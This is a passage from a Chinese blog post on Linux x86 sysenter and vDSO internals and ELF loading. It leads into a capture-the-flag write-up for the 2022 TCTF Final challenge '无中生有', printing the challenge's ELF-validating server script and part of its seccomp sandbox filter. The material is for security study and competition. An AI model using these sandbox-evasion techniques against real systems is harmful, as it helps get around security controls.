class="hljs-number">0x1</span>					orig_ax<br><span class="hljs-number">10</span>:<span class="hljs-number">0080</span>│         <span class="hljs-number">0xffffc90000463fd8</span> ◂— <span class="hljs-number">0x0</span>					ip<br><span class="hljs-number">11</span>:<span class="hljs-number">0088</span>│         <span class="hljs-number">0xffffc90000463fe0</span> ◂— <span class="hljs-number">0x23</span>					cs<br><span class="hljs-number">12</span>:<span class="hljs-number">0090</span>│         <span class="hljs-number">0xffffc90000463fe8</span> ◂— <span class="hljs-number">0x6</span>					flags<br><span class="hljs-number">13</span>:<span class="hljs-number">0098</span>│         <span class="hljs-number">0xffffc90000463ff0</span> ◂— <span class="hljs-number">0x0</span>					sp<br><span class="hljs-number">14</span>:<span class="hljs-number">00</span>a0│         <span class="hljs-number">0xffffc90000463ff8</span> ◂— <span class="hljs-number">0x2b</span>					ss<br></code></pre></td></tr></table></figure>
+
+<p>来康康为什么会变成这样，和用户态不一样的寄存器有rsp，rip，cs（不管rax，ss，cs）</p>
+<p>在push寄存器的时候会直接把rsp和rip记为0，cs置为32位的cs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pushq	$0			/* pt_regs-&gt;sp = 0 (placeholder) */<br>pushfq				/* pt_regs-&gt;flags (except IF = 0) */<br>pushq	$__USER32_CS		/* pt_regs-&gt;cs */<br>pushq	$0			/* pt_regs-&gt;ip = 0 (placeholder) */<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>调用do_SYSENTER_32后的pt_regs</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp <span class="hljs-number">0xffffc90000463f58</span> ◂— <span class="hljs-number">0x1</span>					r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│     <span class="hljs-number">0xffffc90000463f60</span> —▸ <span class="hljs-number">0x4c17d0</span>				 r14<br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│     <span class="hljs-number">0xffffc90000463f68</span> —▸ <span class="hljs-number">0x7ffe7a28fff8</span>		 r13<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│     <span class="hljs-number">0xffffc90000463f70</span> ◂— <span class="hljs-number">0x1</span>					r12<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│     <span class="hljs-number">0xffffc90000463f78</span> ◂— <span class="hljs-number">0x7ffe00000000</span>		 bp			<span class="hljs-comment">// change!</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│     <span class="hljs-number">0xffffc90000463f80</span> ◂— <span class="hljs-number">0x2c</span>					bx<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│     <span class="hljs-number">0xffffc90000463f88</span> ◂— <span class="hljs-number">0x206</span>				r11<br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│     <span class="hljs-number">0xffffc90000463f90</span> ◂— <span class="hljs-number">0x80</span>					r10<br><span class="hljs-number">08</span>:<span class="hljs-number">0040</span>│     <span class="hljs-number">0xffffc90000463f98</span> ◂— <span class="hljs-number">0x800000000000</span>		 r9<br><span class="hljs-number">09</span>:<span class="hljs-number">0048</span>│     <span class="hljs-number">0xffffc90000463fa0</span> —▸ <span class="hljs-number">0x4c7d70</span>				 r8<br><span class="hljs-number">0</span>a:<span class="hljs-number">0050</span>│     <span class="hljs-number">0xffffc90000463fa8</span> ◂— <span class="hljs-number">0xfffffffffffffff2</span>	  ax<br><span class="hljs-number">0b</span>:<span class="hljs-number">0058</span>│     <span class="hljs-number">0xffffc90000463fb0</span> ◂— <span class="hljs-number">0xa</span>					cx<br><span class="hljs-number">0</span>c:<span class="hljs-number">0060</span>│     <span class="hljs-number">0xffffc90000463fb8</span> —▸ <span class="hljs-number">0x7ffe7a290008</span>		 dx<br><span class="hljs-number">0</span>d:<span class="hljs-number">0068</span>│     <span class="hljs-number">0xffffc90000463fc0</span> —▸ <span class="hljs-number">0x7ffe7a28fff8</span>		 si<br><span class="hljs-number">0</span>e:<span class="hljs-number">0070</span>│     <span class="hljs-number">0xffffc90000463fc8</span> ◂— <span class="hljs-number">0x1</span>					di<br><span class="hljs-number">0f</span>:<span class="hljs-number">0078</span>│     <span class="hljs-number">0xffffc90000463fd0</span> ◂— <span class="hljs-number">0x1</span>					orig_ax<br><span class="hljs-number">10</span>:<span class="hljs-number">0080</span>│     <span class="hljs-number">0xffffc90000463fd8</span> —▸ <span class="hljs-number">0x7ffe7a3f0579</span>		 ip			<span class="hljs-comment">// change!</span><br><span class="hljs-number">11</span>:<span class="hljs-number">0088</span>│     <span class="hljs-number">0xffffc90000463fe0</span> ◂— <span class="hljs-number">0x23</span>					cs<br><span class="hljs-number">12</span>:<span class="hljs-number">0090</span>│     <span class="hljs-number">0xffffc90000463fe8</span> ◂— <span class="hljs-number">0x206</span>				flags		<span class="hljs-comment">// change!</span><br><span class="hljs-number">13</span>:<span class="hljs-number">0098</span>│     <span class="hljs-number">0xffffc90000463ff0</span> —▸ <span class="hljs-number">0x7ffe7a28fe10</span>		 sp			 <span class="hljs-comment">// change!</span><br><span class="hljs-number">14</span>:<span class="hljs-number">00</span>a0│     <span class="hljs-number">0xffffc90000463ff8</span> ◂— <span class="hljs-number">0x2b</span>					ss<br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>sysenter使用rbp作为返回时的rsp，flags要加上X86_EFLAGS_IF的标志</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">__visible noinstr <span class="hljs-type">long</span> <span class="hljs-title function_">do_SYSENTER_32</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pt_regs *regs)</span><br>&#123;<br>	<span class="hljs-comment">/* SYSENTER loses RSP, but the vDSO saved it in RBP. */</span><br>	regs-&gt;sp = regs-&gt;bp;<br><br>	<span class="hljs-comment">/* SYSENTER clobbers EFLAGS.IF.  Assume it was set in usermode. */</span><br>	regs-&gt;flags |= X86_EFLAGS_IF;<br><br>	<span class="hljs-keyword">return</span> do_fast_syscall_32(regs);<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>do_fast_syscall_32会自动设置rip为vsdo中一段固定的landing的地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> landing_pad = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)current-&gt;mm-&gt;context.vdso +<br>				vdso_image_32.sym_int80_landing_pad;<br>    <br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * SYSENTER loses EIP, and even SYSCALL32 needs us to skip forward</span><br><span class="hljs-comment"> * so that &#x27;regs-&gt;ip -= 2&#x27; lands back on an int $0x80 instruction.</span><br><span class="hljs-comment"> * Fix it up.</span><br><span class="hljs-comment"> */</span><br>regs-&gt;ip = landing_pad;<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>由于已经将cs设置为32位，所以iretq之后寄存器会被截半</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/iretq.png" srcset="/img/loading.gif" lazyload class title="iretq"></li>
+</ul>
+<p>来看一下正常的sysenter的执行过程</p>
+<ul>
+<li><p>一个sysenter一定是从vdso中来的（传参顺序ebx，ecx，edx）</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/writevdso.png" srcset="/img/loading.gif" lazyload class title="writevdso">
+
+<p>可以看出ebp是用来存esp的</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vdsoo.png" srcset="/img/loading.gif" lazyload class title="vdso">
+
+<p>sysenter的参数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Arguments:</span><br><span class="hljs-comment"> * eax  system call number</span><br><span class="hljs-comment"> * ebx  arg1</span><br><span class="hljs-comment"> * ecx  arg2</span><br><span class="hljs-comment"> * edx  arg3</span><br><span class="hljs-comment"> * esi  arg4</span><br><span class="hljs-comment"> * edi  arg5</span><br><span class="hljs-comment"> * ebp  user stack</span><br><span class="hljs-comment"> * 0(%ebp) arg6</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>do_SYSENTER_32返回之后，可以看出landing_pad已经设置好了</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/landing.png" srcset="/img/loading.gif" lazyload class title="landing">
+</li>
+<li><p>landing成功（如果sysenter失败还要继续int 0x80）</p>
+</li>
+</ul>
+<h2 id="ELF文件启动过程"><a href="#ELF文件启动过程" class="headerlink" title="ELF文件启动过程"></a>ELF文件启动过程</h2><p>解释一些特性的原理</p>
+<ul>
+<li><p>GNU_STACK设为X则权限为RWX</p>
+<p>Linux中对于栈的权限只有可执行和不可执行的判断，默认是可读写的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Stack area protections */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXSTACK_DEFAULT   0	<span class="hljs-comment">/* Whatever the arch defaults to */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXSTACK_DISABLE_X 1	<span class="hljs-comment">/* Disable executable stacks */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXSTACK_ENABLE_X  2	<span class="hljs-comment">/* Enable executable stacks */</span></span><br><br><br>	elf_ppnt = elf_phdata;<br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; elf_ex-&gt;e_phnum; i++, elf_ppnt++)<br>		<span class="hljs-keyword">switch</span> (elf_ppnt-&gt;p_type) &#123;<br>		<span class="hljs-keyword">case</span> PT_GNU_STACK:<br>			<span class="hljs-keyword">if</span> (elf_ppnt-&gt;p_flags &amp; PF_X)<br>				executable_stack = EXSTACK_ENABLE_X;<br>			<span class="hljs-keyword">else</span><br>				executable_stack = EXSTACK_DISABLE_X;<br>			<span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>64位和32位的检查是通过e_machine</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">		<span class="hljs-comment">/* Verify the interpreter has a valid arch */</span><br>		<span class="hljs-keyword">if</span> (!elf_check_arch(interp_elf_ex) ||<br>		    elf_check_fdpic(interp_elf_ex))<br>			<span class="hljs-keyword">goto</span> out_free_dentry;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>	elf_check_arch	compat_elf_check_arch</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> compat_elf_check_arch(x)					\</span><br><span class="hljs-meta">	(elf_check_arch_ia32(x) ||					\</span><br><span class="hljs-meta">	 (IS_ENABLED(CONFIG_X86_X32_ABI) &amp;&amp; (x)-&gt;e_machine == EM_X86_64))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> elf_check_arch_ia32(x) \</span><br><span class="hljs-meta">	(((x)-&gt;e_machine == EM_386) || ((x)-&gt;e_machine == EM_486))</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="2022-TCTF-Final-无中生有"><a href="#2022-TCTF-Final-无中生有" class="headerlink" title="2022 TCTF Final 无中生有"></a>2022 TCTF Final 无中生有</h1><h2 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3 -u</span><br><br><span class="hljs-keyword">import</span> os, sys, random, subprocess, gmpy2<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> elftools.elf.elffile <span class="hljs-keyword">import</span> ELFFile<br><span class="hljs-keyword">from</span> elftools.elf.constants <span class="hljs-keyword">import</span> P_FLAGS<br><br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">sec = <span class="hljs-number">10</span></span>):<br>    <span class="hljs-comment"># From 0CTF/TCTF 2021</span><br>    p = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    q = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    n = p*q<br>    c = <span class="hljs-number">2900000</span><br>    t = c*sec + random.randint(<span class="hljs-number">0</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Show me your computation:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;2^(2^<span class="hljs-subst">&#123;t&#125;</span>) mod <span class="hljs-subst">&#123;n&#125;</span> = ?&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your answer: &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        sol = <span class="hljs-built_in">int</span>(sys.stdin.readline())<br>        phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>        u = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, t, phi)<br>        w = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, u, n)<br>        <span class="hljs-keyword">if</span> w == sol:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Correct!&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong Answer!&#x27;</span>)<br>            exit()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid Input!&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bytes</span>(<span class="hljs-params">data, b</span>):<br>    p = -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = data.find(b, p+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> p == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0xfff</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_elf</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x40</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data.startswith(<span class="hljs-string">b&#x27;\x7fELF\x02\x01\x01&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid ELF Magic&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\xcd\x80&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;\x0f\x05&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\xcd&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x80&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x0f&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x05&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    elf = ELFFile(BytesIO(data))<br>    <span class="hljs-keyword">if</span> ((elf.header.e_type != <span class="hljs-string">&#x27;ET_EXEC&#x27;</span> <span class="hljs-keyword">and</span> elf.header.e_type != <span class="hljs-string">&#x27;ET_DYN&#x27;</span>)<br>        <span class="hljs-keyword">or</span> elf.header.e_version != <span class="hljs-string">&#x27;EV_CURRENT&#x27;</span><br>        <span class="hljs-keyword">or</span> elf.header.e_ehsize != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phoff != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &lt;= <span class="hljs-number">0</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> elf.iter_segments():<br>        <span class="hljs-keyword">if</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_INTERP&#x27;</span> <span class="hljs-keyword">or</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_DYNAMIC&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No dynamic link&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_flags &amp; P_FLAGS.PF_W <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;W^X&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_filesz &gt; <span class="hljs-built_in">len</span>(data) <span class="hljs-keyword">or</span> seg.header.p_memsz &gt; <span class="hljs-built_in">len</span>(data):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Segment too large&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        size = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Size of your ELF: &#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> size &gt; <span class="hljs-number">0x10000</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF File:&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        data = sys.stdin.buffer.read(size)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) != size:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF Received: %d bytes&#x27;</span> % <span class="hljs-built_in">len</span>(data))<br>    <span class="hljs-keyword">if</span> check_elf(data):<br>        filename = sha256(data).hexdigest()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;File Hash: %s&#x27;</span> % filename)<br>        path = <span class="hljs-string">&#x27;./data/&#x27;</span> + filename<br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            os.unlink(path)<br>        <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br>        os.chmod(path, <span class="hljs-number">0o555</span>)<br>        <span class="hljs-keyword">try</span>:<br>            p = subprocess.Popen([<span class="hljs-string">&#x27;docker&#x27;</span>, <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--rm&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;path&#125;</span>:/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;challenge&#x27;</span>, filename], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)<br>            p.wait()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return status: %d&#x27;</span> % p.returncode)<br>            <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">137</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Output:&#x27;</span>)<br>                sys.stdout.buffer.write(p.stdout.read())<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something went wrong!&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> proof_of_work():<br>        main()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bye!&#x27;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>可以上传一个文件，但对文件进行了限制</p>
+<ul>
+<li>ban了 <strong>int 80</strong> 和 <strong>syscall</strong>，考虑了指令跨页的情况</li>
+<li>ELF Header<ul>
+<li>必须为动态 &#x2F; 静态链接可执行文件</li>
+<li>ELF Header大小0x40</li>
+<li>有段表且段表在ELF Header之后</li>
+</ul>
+</li>
+<li>segments<ul>
+<li>没有动态链接段和解释器信息（静态链接文件）</li>
+<li>不能有wx段</li>
+<li>不能有大于ELF大小的段</li>
+</ul>
+</li>
+</ul>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>沙箱</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br><span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0014</span><br><span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br><span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x11</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x10</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span 